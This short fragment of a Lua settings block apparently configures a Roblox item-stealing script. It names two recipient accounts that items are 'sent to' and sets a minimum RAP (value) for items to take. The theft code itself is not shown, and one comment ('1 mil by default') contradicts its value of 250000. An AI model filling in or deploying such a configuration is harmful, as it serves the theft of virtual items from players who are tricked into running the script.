Username = "YACINEPRO337"
Username2 = "OTHMANE611" -- stuff will get sent to this user if first user's mailbox is full
...
min_rap = 250000 -- minimum rap of each item you want to get sent to you. 1 mil by default
